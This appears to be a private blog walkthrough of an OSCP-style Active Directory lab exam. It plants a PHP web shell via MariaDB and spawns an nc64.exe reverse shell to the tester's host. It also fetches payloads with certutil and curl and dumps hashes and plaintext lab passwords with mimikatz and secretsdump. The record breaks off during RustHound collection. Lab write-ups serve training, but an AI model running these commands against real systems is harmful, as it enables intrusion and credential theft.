---
title: OSCP Exam 2
date: 2026-07-09
ShowToc: true
draft: false
TocOpen: true
password: thankshaydon
isPrivate: true
tags:
  - blog
  - offsec
lastmod: 2026-07-24T06:18:49.083Z
---
# Box Info

![dLFFuRu6.canvas](/ob/Canvas/dLFFuRu6.canvas)\
{{< canvas "dLFFuRu6.canvas" >}}

```
Target IP: 172.16.124.200
--------------------------------------

Maximum Potential Points: 40

You have agreed with the client to perform an assumed breach scenario penetration test against their Microsoft Windows Active Directory infrastructure. You can use the credential below to have access to the WS26 client machine in oscp.exam domain.

Username: r.andrews
Password: BusyOfficeWorker890

The final objective of the Active Directory penetration test is to gain Domain Administrator level rights on the network. The Active Directory network can be located at the following IP addresses:


172.16.124.200
172.16.124.202
192.168.124.206

Main Objectives:

- Get Administrative interactive access to the WS26 client machine and obtain proof.txt file in a valid way, note that there is no local.txt file.
- Get Administrative interactive access to the SRV22 client machine and obtain proof.txt file in a valid way, note that there is no local.txt file.
- Get Administrative interactive access to the Domain Controller (DC20) and obtain the proof.txt file in a valid way, note that there is no local.txt file.
- Submit proof.txt files in the Control Panel.

Documentation Requirements:

- Document each step and command of your attack in a way that it can be replicated following a "copy/paste" approach
- Create screenshots showing various steps and stages of the attack performed
- Create a valid screenshot showing the content of proof.txt and the machine IP address
- Provide the link or the copy of the script/exploits being used
- Document any changes done to the original scripts or exploits being used
- Provide a summary and overview of the vulnerabilities found in performed attacks and exploitation processes. You must show all steps executed against the entire Active Directory domain used to obtain Domain Administrator privileges. 

IMPORTANT NOTE: Reverting a single machine is not possible; reverting any AD set machine will revert the entire AD network. Please wait 5 minutes after reverting to ensure all services are operational. The full revert process may take 5-7 minutes.

Please note that not all machines will respond to ICMP/ping requests.

There are no dependencies between the Active Directory set and the stand alone machines.

Target IP: 192.168.124.110
--------------------------------------

Maximum Potential Points: 20

Main Objectives:

- Get interactive access to the machine and obtain local.txt file in valid way
- Submit local.txt in the Control Panel
- Get interactive access to the machine and obtain proof.txt file in valid way
- Submit proof.txt in the Control Panel


Documentation Requirements:

- Document each step and command of your attack in a way that it can be replicated following a "copy/paste" approach
- Create screenshots showing various steps and stages of the attack performed
- Create a valid screenshot showing the content of local.txt and machine IP address
- Create a valid screenshot showing the content of proof.txt and machine IP address
- Provide the link or the copy of the script/exploits being used
- Document any changes done to the original scripts or exploits being used
- Provide a summary and overview of the vulnerabilities found, performed attacks and exploitation process

Target IP: 192.168.124.111
--------------------------------------

Maximum Potential Points: 20

Main Objectives:

- Get interactive access to the machine and obtain local.txt file in valid way
- Submit local.txt in the Control Panel
- Get interactive access to the machine and obtain proof.txt file in valid way
- Submit proof.txt in the Control Panel

Documentation Requirements:

- Document each step and command of your attack in a way that it can be replicated following a "copy/paste" approach
- Create screenshots showing various steps and stages of the attack performed
- Create a valid screenshot showing the content of local.txt and machine IP address
- Create a valid screenshot showing the content of proof.txt and machine IP address
- Provide the link or the copy of the script/exploits being used
- Document any changes done to the original scripts or exploits being used
- Provide a summary and overview of the vulnerabilities found, performed attacks and exploitation process

Target IP: 192.168.124.112
--------------------------------------

Maximum Potential Points: 20

Main Objectives:

- Get interactive access to the machine and obtain local.txt file in valid way
- Submit local.txt in the Control Panel
- Get interactive access to the machine and obtain proof.txt file in valid way
- Submit proof.txt in the Control Panel


Documentation Requirements:

- Document each step and command of your attack in a way that it can be replicated following a "copy/paste" approach
- Create screenshots showing various steps and stages of the attack performed 
- Create a valid screenshot showing the content of local.txt and machine IP address
- Create a valid screenshot showing the content of proof.txt and machine IP address
- Provide the link or the copy of the script/exploits being used
- Document any changes done to the original scripts or exploits being used
- Provide a summary and overview of the vulnerabilities found, performed attacks and exploitation process


```

***

# Recon 192.168.124.206

### \[\[PORT & IP SCAN]]

Using the nmap to

```
Nmap scan report for 192.168.124.206
Host is up (0.22s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.58 ((Win64) OpenSSL/3.1.3 PHP/8.2.12)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Home - OffSec NIC
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.58 ((Win64) OpenSSL/3.1.3 PHP/8.2.12)
|_ssl-date: TLS randomness does not represent time
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Home - OffSec NIC
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql         MariaDB 10.3.23 or earlier (unauthorized)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-07-09T11:53:18+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: OSCP
|   NetBIOS_Domain_Name: OSCP
|   NetBIOS_Computer_Name: WS26
|   DNS_Domain_Name: oscp.exam
|   DNS_Computer_Name: WS26.oscp.exam
|   DNS_Tree_Name: oscp.exam
|   Product_Version: 10.0.22000
|_  System_Time: 2026-07-09T11:53:02+00:00
| ssl-cert: Subject: commonName=WS26.oscp.exam
| Not valid before: 2026-02-15T18:45:41
|_Not valid after:  2026-08-17T18:45:41
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-07-09T11:53:02
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 189.76 seconds
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-09 19:53 HKT
Nmap scan report for 192.168.124.206
Host is up (0.23s latency).
Not shown: 98 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
497/udp   closed retrospect
20031/udp closed bakbonenetvault

Nmap done: 1 IP address (1 host up) scanned in 3.04 seconds

```

Validate credentials against exposed remote management services using NetExec:

```
─[tester@parrot]─[~/Desktop/offsec/oscpRealexam]
└──╼ $for proto in smb winrm wmi rdp ssh ldap mssql ftp; do for auth in "" "--local-auth"; do echo -e "\n[*] Testing $proto ${auth:+(local-auth)}...";  netexec $proto 192.168.124.206 -u r.andrews -p  BusyOfficeWorker890  $auth --continue-on-success ; done; done

[*] Testing smb ...
SMB         192.168.124.206 445    WS26             [*] Windows 11 Build 22000 x64 (name:WS26) (domain:oscp.exam) (signing:False) (SMBv1:None)
SMB         192.168.124.206 445    WS26             [+] oscp.exam\r.andrews:BusyOfficeWorker890 

[*] Testing smb (local-auth)...
SMB         192.168.124.206 445    WS26             [*] Windows 11 Build 22000 x64 (name:WS26) (domain:WS26) (signing:False) (SMBv1:None)
SMB         192.168.124.206 445    WS26             [-] WS26\r.andrews:BusyOfficeWorker890 STATUS_LOGON_FAILURE 

[*] Testing winrm ...
WINRM       192.168.124.206 5985   WS26             [*] Windows 11 Build 22000 (name:WS26) (domain:oscp.exam) 
WINRM       192.168.124.206 5985   WS26             [+] oscp.exam\r.andrews:BusyOfficeWorker890 (Pwn3d!)

[*] Testing winrm (local-auth)...
WINRM       192.168.124.206 5985   WS26             [*] Windows 11 Build 22000 (name:WS26) (domain:oscp.exam) 
WINRM       192.168.124.206 5985   WS26             [-] WS26\r.andrews:BusyOfficeWorker890

[*] Testing wmi ...
RPC         192.168.124.206 135    WS26             [*] Windows 11 Build 22000 (name:WS26) (domain:oscp.exam)
RPC         192.168.124.206 135    WS26             [+] oscp.exam\r.andrews:BusyOfficeWorker890 

[*] Testing wmi (local-auth)...
RPC         192.168.124.206 135    WS26             [*] Windows 11 Build 22000 (name:WS26) (domain:oscp.exam)
RPC         192.168.124.206 135    WS26             [-] WS26\r.andrews:BusyOfficeWorker890 (RPC_S_ACCESS_DENIED)

[*] Testing rdp ...
RDP         192.168.124.206 3389   WS26             [*] Windows 10 or Windows Server 2016 Build 22000 (name:WS26) (domain:oscp.exam) (nla:True)
RDP         192.168.124.206 3389   WS26             [+] oscp.exam\r.andrews:BusyOfficeWorker890 (Pwn3d!)

[*] Testing rdp (local-auth)...
RDP         192.168.124.206 3389   WS26             [*] Windows 10 or Windows Server 2016 Build 22000 (name:WS26) (domain:WS26) (nla:True)
RDP         192.168.124.206 3389   WS26             [-] WS26\r.andrews:BusyOfficeWorker890 (STATUS_LOGON_FAILURE)

[*] Testing ssh ...

[*] Testing ssh (local-auth)...
usage: netexec [-h] [--version] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--no-progress] [--log LOG] [--verbose | --debug] [-6] [--dns-server DNS_SERVER] [--dns-tcp]
               [--dns-timeout DNS_TIMEOUT]
               {wmi,winrm,vnc,ssh,rdp,nfs,ldap,ftp,smb,mssql} ...
netexec: error: unrecognized arguments: --local-auth

[*] Testing ldap ...

[*] Testing ldap (local-auth)...
usage: netexec [-h] [--version] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--no-progress] [--log LOG] [--verbose | --debug] [-6] [--dns-server DNS_SERVER] [--dns-tcp]
               [--dns-timeout DNS_TIMEOUT]
               {wmi,winrm,vnc,ssh,rdp,nfs,ldap,ftp,smb,mssql} ...
netexec: error: unrecognized arguments: --local-auth

[*] Testing mssql ...

[*] Testing mssql (local-auth)...

[*] Testing ftp ...

[*] Testing ftp (local-auth)...
usage: netexec [-h] [--version] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--no-progress] [--log LOG] [--verbose | --debug] [-6] [--dns-server DNS_SERVER] [--dns-tcp]
               [--dns-timeout DNS_TIMEOUT]
               {wmi,winrm,vnc,ssh,rdp,nfs,ldap,ftp,smb,mssql} ...
netexec: error: unrecognized arguments: --local-auth
[ble: exit 2][ble: elapsed 63.788s (CPU 50.6%)] for proto in smb winrm wmi rdp ssh ldap mssql ftp; do for auth in "" "--local-auth"; do echo -e
```

### winrm

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpRealexam]
└──╼ $evil-winrm-py -i 192.168.124.206  -u r.andrews  -p "BusyOfficeWorker890"
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to '192.168.124.206:5985' as 'r.andrews'
evil-winrm-py PS C:\Users\r.andrews\Documents> whoami
oscp\r.andrews

```

### MariaDB

From an authenticated WinRM session as r.andrews , confirm local, unauthenticated root access to MariaDB

```
evil-winrm-py PS C:\xampp\mysql\bin> ./mysql.exe -u root -h localhost -e "SELECT VERSION();"
VERSION()
10.4.32-MariaDB
```

Use SELECT ... INTO OUTFILE to write a PHP web shell into the Apache web root

```
evil-winrm-py PS C:\xampp\mysql\bin> @'
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE 'C:/xampp/htdocs/shell.php';
'@ | Out-File -Encoding ascii C:\Users\r.andrews\Documents\payload.sql

```

Execute the SQL file against the local MariaDB instance.

```
evil-winrm-py PS C:\xampp\mysql\bin> Get-Content C:\Users\r.andrews\Documents\payload.sql |./mysql.exe -u root -h localhost

```

```
evil-winrm-py PS C:\xampp\mysql\bin> Test-Path C:\xampp\htdocs\shell.php
True

```

Trigger command execution via HTTP GET request to the planted web shell, confirming code execution as SYSTEM

http://192.168.124.206/shell.php?cmd=whoami

![Pasted image 20260709230342.png](/ob/Pasted%20image%2020260709230342.png)

Upload nc64.exe and use the web shell to spawn a reverse shell back to the attacking host, confirming an interactive SYSTEM shell.

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpRealexam]
└──╼ $wget https://github.com/int0x33/nc.exe/raw/refs/heads/master/nc64.exe
--2026-07-09 23:08:22--  https://github.com/int0x33/nc.exe/raw/refs/heads/master/nc64.exe
Resolving github.com (github.com)... 20.205.243.166
```

```
cd C:\ProgramData
```

```
evil-winrm-py PS C:\ProgramData> upload nc64.exe .
Uploading /home/tester/Desktop/offsec/oscpRealexam/nc64.exe: 100%|█| 44.2k/44.2k [00:01<00:00, 43.7kB/s
[+] File uploaded successfully as: C:\ProgramData\nc64.exe

```

Upload nc64.exe via evil-winrm-py, then trigger reverse shell as SYSTEM

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpRealexam]
└──╼ $curl -G "http://192.168.124.206/shell.php" --data-urlencode "cmd=C:\ProgramData\nc64.exe -e cmd.exe 192.168.49.124 4444"

```

Starting the nc

```
┌─[✗]─[tester@parrot]─[~/Desktop/offsec/oscpRealexam]
└──╼ $sudo rlwrap nc -nlvp 4444
[sudo] password for tester: 
Listening on 0.0.0.0 4444

```

Catch shell

```
C:\xampp\htdocs>whoami 
whoami 
nt authority\system


```

### Add into high group

After obtaining a SYSTEM-level reverse shell via the MariaDB-to-webshell privilege escalation chain, command execution as nt authority\system was confirmed on WS26

```
C:\Users\Administrator\Desktop>net localgroup administrators r.andrews /add

net localgroup administrators r.andrews /add
The command completed successfully.


C:\Users\Administrator\Desktop>
C:\Users\Administrator\Desktop>net group "Domain Admins" r.andrews /add /domain

net group "Domain Admins" r.andrews /add /domain
The request will be processed at a domain controller for domain oscp.exam.

System error 5 has occurred.

Access is denied.


C:\Users\Administrator\Desktop>
C:\Users\Administrator\Desktop>net localgroup administrators
net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
OSCP\Domain Admins
OSCP\r.andrews
The command completed successfully.

```

### mimikatz.exe

```
└──╼ $python -m uploadserver
File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.124.206 - - [09/Jul/2026 23:22:29] "GET /mimikatz.exe HTTP/1.1" 200 -


```

Credential dumping was then performed using LaZagne, mimikatz, and impacket-secretsdump, recovering local SAM hashes, cached domain logon (DCC2) hashes, LSA secrets, and a plaintext credential for domain user v.perry stored in the \_SC\_SNMPTrap LSA secret:

```
C:\Users\Administrator\Desktop>curl http://192.168.49.124:8000/mimikatz.exe -o mimikatz.exe
curl http://192.168.49.124:8000/mimikatz.exe -o mimikatz.exe
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 1323k  100 1323k    0     0   691k      0  0:00:01  0:00:01 --:--:--  691k

```

```
User Name : v.perry
Domain : OSCP
Logon Server : DC20
kerberos :
Password : SurfaceConditionMove441
```

`v.perry:SurfaceConditionMove441`

### impacket-secretsdump

impacket-secretsdump also can do with that

```
┌─[✗]─[tester@parrot]─[~/Desktop/offsec/oscpRealexam]
└──╼ $impacket-secretsdump oscp.exam/r.andrews:"BusyOfficeWorker890"@192.168.124.206

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x3a3e0b3fd4b3356b29acb8e99d9e5baa
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:28958285a85d524a5356c299172eae06:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:1bdaa41831e2f8640d3d042cc0426da6:::
[*] Dumping cached domain logon information (domain/username:hash)
OSCP.EXAM/v.perry:$DCC2$10240#v.perry#329c0beac9427a4c5bb25989f3265721: (2026-05-01 18:28:57)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
OSCP\WS26$:aes256-cts-hmac-sha1-96:ac191bb2ec1ee5b5dec38eedb0f0cf619b898a3c98ffa5fd67835493e03dbb55
OSCP\WS26$:aes128-cts-hmac-sha1-96:ef9b812c004d065d73c571a00f24975e
OSCP\WS26$:des-cbc-md5:29aee03efbbaad15
OSCP\WS26$:plain_password_hex:e7ca4fb83489cba8f3fc26a91e7ef263cf96087825d68f1cfc71aca558114dbb0d9028c7edd876944b885fffda42bcf4f393a6947a1c0d6afea78473cbf5110efae1653acd9ee45391b70152427dc25fb275ca584edf4e7676b0b855aff14eb4e9047d56516bb5792ed5824232d69ec776bc4668137d9e3df38ed3a1c49da9d4703a5c765abd3a7a94b0ce45915d0e2d18b015d8c463aaf8e9f7a0c5cacc0e84460f7dbeef03bd0f43c5cf700e3418a89e27f3489025cf7f8033737901db9a068a2232888ce8b7257f6dd3fd91af1cccd81a391dd5c622280dea389e3e45e49ab8ebd88286d5d8600de8bf8e1379f64b
OSCP\WS26$:aad3b435b51404eeaad3b435b51404ee:e5971e3b721225d3e43604a944d43579:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xe268251a6bbdd4c27902c430f0531e8855a9bb2d
dpapi_userkey:0xf66fbf169df2e72afa818d9d948dab5dae79f113
[*] NL$KM 
 0000   40 19 00 C6 05 93 5F C3  68 A9 B5 08 EB 51 1D 02   @....._.h....Q..
 0010   C9 46 A8 8B 3E EF BD 0B  70 7B 86 0D 2F 90 4C 8F   .F..>...p{../.L.
 0020   EF DB E0 C8 55 4E D1 18  DC A1 ED 3F 73 22 24 31   ....UN.....?s"$1
 0030   D8 83 EB 6A FE F6 1F 72  CB 22 15 13 91 F1 D8 D8   ...j...r."......
NL$KM:401900c605935fc368a9b508eb511d02c946a88b3eefbd0b707b860d2f904c8fefdbe0c8554ed118dca1ed3f73222431d883eb6afef61f72cb22151391f1d8d8
[*] _SC_SNMPTrap 
oscp\v.perry:SurfaceConditionMove441
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry

```

```autohotkey
certutil -urlcache -split -f http://192.168.49.124:8082/agent.exe C:\ProgramData\agent.exe
```

nxc 's lsassy is uselesss

```
┌─[✗]─[tester@parrot]─[~/Desktop/offsec/oscpRealexam]
└──╼ $nxc smb 192.168.124.206  -u r.andrews  -p "BusyOfficeWorker890" -M lsassy
SMB         192.168.124.206 445    WS26             [*] Windows 11 Build 22000 x64 (name:WS26) (domain:oscp.exam) (signing:False) (SMBv1:None)
SMB         192.168.124.206 445    WS26             [+] oscp.exam\r.andrews:BusyOfficeWorker890 (Pwn3d!)
LSASSY      192.168.124.206 445    WS26             Saved 15 Kerberos ticket(s) to /home/tester/.nxc/modules/lsassy
LSASSY      192.168.124.206 445    WS26             \Administrator 28958285a85d524a5356c299172eae06
LSASSY      192.168.124.206 445    WS26             \v.perry 0acebaf816de9d6d66b8cde7255d3dc2
LSASSY      192.168.124.206 445    WS26             OSCP.EXAM\v.perry 袀嵓家䦆aceConditionMove441

```

### naabu.exe

.\agent.exe -connect 192.168.49.124:11601 -ignore-cert

set the ligolo\
![Pasted image 20260709233533.png](/ob/Pasted%20image%2020260709233533.png)

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpRealexam]
└──╼ $for proto in smb winrm wmi rdp ssh ldap mssql ftp; do for auth in "" "--local-auth"; do echo -e "\n[*] Testing $proto ${auth:+(local-auth)}...";  netexec $proto 172.16.124.200 -u v.perry -p  SurfaceConditionMove441  $auth --continue-on-success ; done; done

[*] Testing smb ...
SMB         172.16.124.200  445    DC20             [*] Windows Server 2022 Build 20348 x64 (name:DC20) (domain:oscp.exam) (signing:True) (SMBv1:None)
SMB         172.16.124.200  445    DC20             [+] oscp.exam\v.perry:SurfaceConditionMove441 

[*] Testing smb (local-auth)...
SMB         172.16.124.200  445    DC20             [*] Windows Server 2022 Build 20348 x64 (name:DC20) (domain:DC20) (signing:True) (SMBv1:None)
SMB         172.16.124.200  445    DC20             [-] DC20\v.perry:SurfaceConditionMove441 STATUS_LOGON_FAILURE 

[*] Testing winrm ...
WINRM       172.16.124.200  5985   DC20             [*] Windows Server 2022 Build 20348 (name:DC20) (domain:oscp.exam) 
WINRM       172.16.124.200  5985   DC20             [-] oscp.exam\v.perry:SurfaceConditionMove441

[*] Testing winrm (local-auth)...
WINRM       172.16.124.200  5985   DC20             [*] Windows Server 2022 Build 20348 (name:DC20) (domain:oscp.exam) 
WINRM       172.16.124.200  5985   DC20             [-] DC20\v.perry:SurfaceConditionMove441

[*] Testing wmi ...
RPC         172.16.124.200  135    DC20             [*] Windows Server 2022 Build 20348 (name:DC20) (domain:oscp.exam)
RPC         172.16.124.200  135    DC20             [+] oscp.exam\v.perry:SurfaceConditionMove441 

[*] Testing wmi (local-auth)...
RPC         172.16.124.200  135    DC20             [*] Windows Server 2022 Build 20348 (name:DC20) (domain:oscp.exam)
RPC         172.16.124.200  135    DC20             [-] DC20\v.perry:SurfaceConditionMove441 (RPC_S_ACCESS_DENIED)

[*] Testing rdp ...

```

***

# Recon 172.16.124.200

### \[\[PORT & IP SCAN]]

```
evil-winrm-py PS C:\Users\r.andrews\Documents> ./naabu.exe  -p 1-65535 -host 172.16.124.200
172.16.124.200:49666
172.16.124.200:3268
172.16.124.200:3269
172.16.124.200:445
172.16.124.200:49668
172.16.124.200:389
172.16.124.200:88
172.16.124.200:49677
172.16.124.200:593
172.16.124.200:57244
172.16.124.200:49667
172.16.124.200:49665
172.16.124.200:139
172.16.124.200:636
172.16.124.200:49679
172.16.124.200:49664
172.16.124.200:9389
172.16.124.200:47001
172.16.124.200:5985
172.16.124.200:135
172.16.124.200:53
172.16.124.200:49811
172.16.124.200:49675
172.16.124.200:464
172.16.124.200:49672
System.Management.Automation.RemoteException
                  __
  ___  ___  ___ _/ /  __ __
 / _ \/ _ \/ _ \/ _ \/ // /
/_//_/\_,_/\_,_/_.__/\_,_/
System.Management.Automation.RemoteException
		projectdiscovery.io
System.Management.Automation.RemoteException
[WRN] UI Dashboard is disabled, Use -dashboard option to enable
[INF] Running CONNECT scan with non root privileges
[INF] Found 25 ports on host 172.16.124.200 (172.16.124.200)

```

```
└──╼ $sudo nmap -sT -Pn -p- 172.16.124.200 -T4 --min-rate 500

Not shown: 65510 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49672/tcp open  unknown
49675/tcp open  unknown
49677/tcp open  unknown
49679/tcp open  unknown
49811/tcp open  unknown
57244/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 774.51 seconds
[ble: EOF]       
```

### loop

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpRealexam]
└──╼ $for proto in smb winrm wmi rdp ssh ldap mssql ftp; do for auth in "" "--local-auth"; do echo -e "\n[*] Testing $proto ${auth:+(local-auth)}...";  netexec $proto 172.16.124.200 -u v.perry -p  SurfaceConditionMove441  $auth --continue-on-success ; done; done

[*] Testing smb ...
SMB         172.16.124.200  445    DC20             [*] Windows Server 2022 Build 20348 x64 (name:DC20) (domain:oscp.exam) (signing:True) (SMBv1:None)
SMB         172.16.124.200  445    DC20             [+] oscp.exam\v.perry:SurfaceConditionMove441 

[*] Testing smb (local-auth)...
SMB         172.16.124.200  445    DC20             [*] Windows Server 2022 Build 20348 x64 (name:DC20) (domain:DC20) (signing:True) (SMBv1:None)
SMB         172.16.124.200  445    DC20             [-] DC20\v.perry:SurfaceConditionMove441 STATUS_LOGON_FAILURE 

[*] Testing winrm ...
WINRM       172.16.124.200  5985   DC20             [*] Windows Server 2022 Build 20348 (name:DC20) (domain:oscp.exam) 
WINRM       172.16.124.200  5985   DC20             [-] oscp.exam\v.perry:SurfaceConditionMove441

[*] Testing winrm (local-auth)...
WINRM       172.16.124.200  5985   DC20             [*] Windows Server 2022 Build 20348 (name:DC20) (domain:oscp.exam) 
WINRM       172.16.124.200  5985   DC20             [-] DC20\v.perry:SurfaceConditionMove441

[*] Testing wmi ...
RPC         172.16.124.200  135    DC20             [*] Windows Server 2022 Build 20348 (name:DC20) (domain:oscp.exam)
RPC         172.16.124.200  135    DC20             [+] oscp.exam\v.perry:SurfaceConditionMove441 

[*] Testing wmi (local-auth)...
RPC         172.16.124.200  135    DC20             [*] Windows Server 2022 Build 20348 (name:DC20) (domain:oscp.exam)
RPC         172.16.124.200  135    DC20             [-] DC20\v.perry:SurfaceConditionMove441 (RPC_S_ACCESS_DENIED)

[*] Testing rdp ...

[*] Testing rdp (local-auth)...

[*] Testing ssh ...

[*] Testing ssh (local-auth)...
usage: netexec [-h] [--version] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--no-progress] [--log LOG] [--verbose | --debug] [-6] [--dns-server DNS_SERVER] [--dns-tcp]
               [--dns-timeout DNS_TIMEOUT]
               {wmi,winrm,vnc,ssh,rdp,nfs,ldap,ftp,smb,mssql} ...
netexec: error: unrecognized arguments: --local-auth

[*] Testing ldap ...
LDAP        172.16.124.200  389    DC20             [*] Windows Server 2022 Build 20348 (name:DC20) (domain:oscp.exam) (signing:None) (channel binding:No TLS cert) 
LDAP        172.16.124.200  389    DC20             [+] oscp.exam\v.perry:SurfaceConditionMove441 

[*] Testing ldap (local-auth)...
usage: netexec [-h] [--version] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--no-progress] [--log LOG] [--verbose | --debug] [-6] [--dns-server DNS_SERVER] [--dns-tcp]
               [--dns-timeout DNS_TIMEOUT]
               {wmi,winrm,vnc,ssh,rdp,nfs,ldap,ftp,smb,mssql} ...
netexec: error: unrecognized arguments: --local-auth

[*] Testing mssql ...

[*] Testing mssql (local-auth)...

[*] Testing ftp ...

```

### smb

```
┌─[✗]─[tester@parrot]─[~/Desktop/offsec/oscpRealexam]
└──╼ $nxc smb 172.16.124.200 -u v.perry -p  SurfaceConditionMove441 --shares
SMB         172.16.124.200  445    DC20             [*] Windows Server 2022 Build 20348 x64 (name:DC20) (domain:oscp.exam) (signing:True) (SMBv1:None)
SMB         172.16.124.200  445    DC20             [+] oscp.exam\v.perry:SurfaceConditionMove441 
SMB         172.16.124.200  445    DC20             [*] Enumerated shares
SMB         172.16.124.200  445    DC20             Share           Permissions     Remark
SMB         172.16.124.200  445    DC20             -----           -----------     ------
SMB         172.16.124.200  445    DC20             ADMIN$                          Remote Admin
SMB         172.16.124.200  445    DC20             C$                              Default share
SMB         172.16.124.200  445    DC20             IPC$            READ            Remote IPC
SMB         172.16.124.200  445    DC20             NETLOGON        READ            Logon server share 
SMB         172.16.124.200  445    DC20             SYSVOL          READ            Logon server share 

```

### Bloodhound

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpRealexam]
└──╼ $netexec ldap DC20.oscp.exam  -u v.perry -p  SurfaceConditionMove441  --bloodhound -c All --dns-server 172.16.124.200
LDAP        172.16.124.200  389    DC20             [*] Windows Server 2022 Build 20348 (name:DC20) (domain:oscp.exam) (signing:None) (channel binding:No TLS cert) 
LDAP        172.16.124.200  389    DC20             [+] oscp.exam\v.perry:SurfaceConditionMove441 
LDAP        172.16.124.200  389    DC20             Resolved collection methods: localadmin, rdp, dcom, container, acl, objectprops, session, trusts, psremote, group
LDAP        172.16.124.200  389    DC20             Done in 1M 22S
LDAP        172.16.124.200  389    DC20             Compressing output into /home/tester/.nxc/logs/DC20_172.16.124.200_2026-07-10_001753_bloodhound.zip
[ble: elapsed 93.095s (CPU 16.6%)] netexec ldap DC20.oscp.exam  -u v.perry -p  SurfaceConditionMove441
```

### rustscan

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpRealexam]
└──╼ $./rusthound-ce --domain oscp.exam  -u v.perry -p  SurfaceConditionMove441   --zip
---------------------------------------------------
Initializing RustHound-CE at 00:53:47 on 07/10/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-07-09T16:53:47Z INFO  rusthound_ce] Verbosity level: Info
[2026-07-09T16:53:47Z INFO  rusthound_ce] Collection method: All
[2026-07-09T16:53:48Z INFO  rusthound_ce::ldap] Connected to OSCP.EXAM Active Directory!
[2026-07-09T16:53:48Z INFO  rusthound_ce::ldap] Starting data collection...
[2026-07-09T16:53:48Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-07-09T16:53:59Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=oscp,DC=exam
[2026-07-09T16:53:59Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
